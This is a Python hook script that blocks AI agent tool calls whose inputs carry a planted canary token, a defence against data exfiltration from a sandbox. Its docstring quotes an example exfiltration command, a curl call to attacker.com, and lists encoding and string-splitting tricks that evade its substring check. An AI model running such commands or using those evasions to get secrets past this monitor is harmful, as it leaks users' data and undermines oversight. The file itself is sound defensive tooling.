#!/usr/bin/env python3
"""Claude Code PreToolUse hook: canary token exfiltration prevention.

Checks whether a pre-injected canary token appears in tool inputs.
Catches exfiltration attempts before data leaves the sandbox — e.g.,
an agent running `curl attacker.com/$CANARY` in a Bash command,
passing the canary as a WebFetch URL parameter, or writing it into
an MCP tool input (issue comment, PR body, etc.).

Complements canary_posttool.py which checks tool results (outputs).

Protocol: reads JSON from stdin (tool_name, tool_input),
writes JSON to stdout if blocking. Exit 0 = allow, exit 1 = block.

Environment variables:
  FULLSEND_CANARY_TOKEN: The canary string to watch for in tool inputs.
                         If unset, the hook is a no-op (allow all).

Known limitations:
  - Plain substring match only. Encoded representations (base64,
    URL-encoding, hex escaping) and string splitting/concatenation
    in shell commands will evade detection.
"""

from __future__ import annotations

import json
import os
import sys
from datetime import UTC, datetime

FINDINGS_PATH = "/tmp/workspace/.security/findings.jsonl"
MAX_INPUT_BYTES = 10 * 1024 * 1024  # 10 MB

_ERR_MALFORMED = '{"decision":"block","reason":"CANARY_HOOK_ERROR: malformed JSON input"}'
_ERR_UNEXPECTED = (
    '{"decision":"block","reason":"CANARY_HOOK_ERROR: unexpected error reading input"}'
)
_ERR_OVERSIZED = '{"decision":"block","reason":"CANARY_HOOK_ERROR: input exceeds 10 MB limit"}'


def log_finding(name: str, severity: str, detail: str, action: str) -> None:
    trace_id = os.environ.get("FULLSEND_TRACE_ID", "")
    finding = {
        "trace_id": trace_id,
        "timestamp": datetime.now(UTC).isoformat(),
        "phase": "hook_pretool",
        "scanner": "canary_pretool",
        "name": name,
        "severity": severity,
        "detail": detail,
        "action": action,
    }
    try:
        os.makedirs(os.path.dirname(FINDINGS_PATH), exist_ok=True)
        with open(FINDINGS_PATH, "a") as f:
            f.write(json.dumps(finding) + "\n")
    except OSError:
        pass


def main() -> None:
    try:
        raw = sys.stdin.read(MAX_INPUT_BYTES + 1)
        if len(raw) > MAX_INPUT_BYTES:
            sys.stdout.write(_ERR_OVERSIZED)
            sys.exit(1)
        if not raw.strip():
            sys.exit(0)
        hook_input = json.loads(raw)
    except json.JSONDecodeError:
        sys.stdout.write(_ERR_MALFORMED)
        sys.exit(1)
    except Exception:  # noqa: BLE001
        sys.stdout.write(_ERR_UNEXPECTED)
        sys.exit(1)

    canary = os.environ.get("FULLSEND_CANARY_TOKEN", "").strip()
    if not canary:
        sys.exit(0)

    tool_input = hook_input.get("tool_input", "")
    if not isinstance(tool_input, str):
        tool_input = json.dumps(tool_input)

    if canary.lower() in tool_input.lower():
        tool_name = hook_input.get("tool_name", "unknown")
        reason = f"CANARY_EXFIL: canary token found in {tool_name} input"
        log_finding("canary_exfil", "critical", reason, "block")
        json.dump({"decision": "block", "reason": reason}, sys.stdout)
        sys.exit(1)

    sys.exit(0)


if __name__ == "__main__":
    main()
